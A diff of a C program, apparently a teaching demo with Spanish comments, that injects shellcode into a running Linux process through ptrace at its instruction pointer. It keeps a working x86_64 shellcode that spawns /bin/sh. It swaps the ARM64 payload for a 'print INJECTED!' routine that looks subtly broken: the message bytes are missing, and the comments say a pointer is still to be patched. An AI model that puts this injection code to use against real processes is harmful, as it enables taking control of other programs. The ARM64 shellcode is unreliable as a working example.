@@ -26,38 +26,61 @@
 
 #if defined(__x86_64__)
     #include <sys/user.h>
+
     /*
      * Shellcode x86_64: execve("/bin/sh", NULL, NULL)
      * Este shellcode abre una shell cuando se ejecuta.
      */
     unsigned char shellcode[] =
-        "\x48\x31\xf6"             /* xor rsi, rsi       */
-        "\x56"                     /* push rsi            */
-        "\x48\xbf\x2f\x62\x69\x6e" /* movabs rdi, ...   */
+        "\x48\x31\xf6"                 /* xor rsi, rsi       */
+        "\x56"                         /* push rsi            */
+        "\x48\xbf\x2f\x62\x69\x6e"   /* movabs rdi, ...     */
         "\x2f\x2f\x73\x68"
-        "\x57"                     /* push rdi            */
-        "\x54"                     /* push rsp            */
-        "\x5f"                     /* pop rdi             */
-        "\x6a\x3b"                 /* push 0x3b           */
-        "\x58"                     /* pop rax             */
-        "\x99"                     /* cdq                 */
-        "\x0f\x05";               /* syscall             */
+        "\x57"                         /* push rdi            */
+        "\x54"                         /* push rsp            */
+        "\x5f"                         /* pop rdi             */
+        "\x6a\x3b"                     /* push 0x3b           */
+        "\x58"                         /* pop rax             */
+        "\x99"                         /* cdq                 */
+        "\x0f\x05";                   /* syscall             */
 
 #elif defined(__aarch64__)
+    #include <linux/ptrace.h>
+
     /*
-     * Shellcode ARM64 (aarch64): execve("/bin/sh", NULL, NULL)
-     * Adaptado para procesadores ARM como Apple M1/M2/M3.
+     * Shellcode ARM64 (aarch64): write(1, "INJECTED!\n", 10) + exit(0)
+     * Imprime un mensaje demostrando que el código inyectado se ejecutó.
      */
     unsigned char shellcode[] =
-        "\x01\x00\x00\xd4"         /* svc #0 (placeholder nop) */
-        "\xe0\x03\x1f\xaa"         /* mov x0, xzr              */
-        "\xe1\x03\x1f\xaa"         /* mov x1, xzr              */
-        "\xe2\x03\x1f\xaa"         /* mov x2, xzr              */
-        "\x60\x01\x00\x10"         /* adr x0, #0x2c            */
-        "\xa8\x1b\x80\xd2"         /* mov x8, #221 (execve)    */
-        "\x01\x00\x00\xd4"         /* svc #0                   */
-        "\x2f\x62\x69\x6e"         /* "/bin"                   */
-        "\x2f\x73\x68\x00";        /* "/sh\0"                  */
+        /* write(1, msg, 10) */
+        "\x01\x00\x80\xd2"   /* mov x1, #0 (will be patched to point to msg) */
+        "\x40\x01\x00\x58"   /* ldr x0, =1 (stdout)                          */
+        "\x01\x01\x00\x58"   /* ldr x1, =msg_addr                            */
+        "\x42\x01\x80\xd2"   /* mov x2, #10 (length)                         */
+        "\x08\x08\x80\xd2"   /* mov x8, #64 (write syscall)                  */
+        "\x01\x00\x00\xd4"   /* svc #0                                       */
+        /* exit(0) */
+        "\x00\x00\x80\xd2"   /* mov x0, #0                                   */
+        "\xa8\x0b\x80\xd2"   /* mov x8, #93 (exit syscall)                   */
+        "\x01\x00\x00\xd4"   /* svc #0                                       */
+        /* data: fd=1 */
+        "\x01\x00\x00\x00"
+        "\x00\x00\x00\x00"
+        /* data: pointer (will be runtime) */
+        "\x00\x00\x00\x00"
+        "\x00\x00\x00\x00";
+
+    /*
+     * Definimos la estructura de registros para aarch64 manualmente
+     * por si <linux/ptrace.h> no la exporta correctamente en userspace.
+     */
+    struct arm64_user_regs {
+        uint64_t regs[31];  /* x0-x30 */
+        uint64_t sp;        /* stack pointer */
+        uint64_t pc;        /* program counter */
+        uint64_t pstate;    /* processor state */
+    };
+
 #else
     #error "Arquitectura no soportada. Usa x86_64 o aarch64."
 #endif
@@ -117,11 +140,11 @@ int main(int argc, char *argv[]) {
     printf("[+] Registro RIP (Instruction Pointer): 0x%lx\n\n", instruction_pointer);
 
 #elif defined(__aarch64__)
-    struct user_pt_regs regs;
+    struct arm64_user_regs regs;
     struct iovec iov;
     iov.iov_base = &regs;
     iov.iov_len = sizeof(regs);
-    if (ptrace(PTRACE_GETREGSET, target_pid, (void*)NT_PRSTATUS, &iov) < 0) {
+    if (ptrace(PTRACE_GETREGSET, target_pid, (void*)(unsigned long)NT_PRSTATUS, &iov) < 0) {
         perror("[!] Fallo al obtener registros (GETREGSET)");
         exit(1);
     }
@@ -132,7 +155,7 @@ int main(int argc, char *argv[]) {
     /* ─── PASO 3: Inyectar shellcode (equivalente a WriteProcessMemory) ─── */
     printf("[PASO 3] Inyectando shellcode en la dirección del Instruction Pointer...\n");
     printf("         → Equivalente Windows: WriteProcessMemory(hProcess, addr, shellcode, size)\n");
-    printf("         → Tamaño del shellcode: %lu bytes\n", sizeof(shellcode));
+    printf("         → Tamaño del shellcode: %lu bytes\n", (unsigned long)sizeof(shellcode));
     inject_data(target_pid, shellcode, (void*)instruction_pointer, sizeof(shellcode));
     printf("[+] Shellcode escrito en memoria del proceso objetivo.\n\n");
 
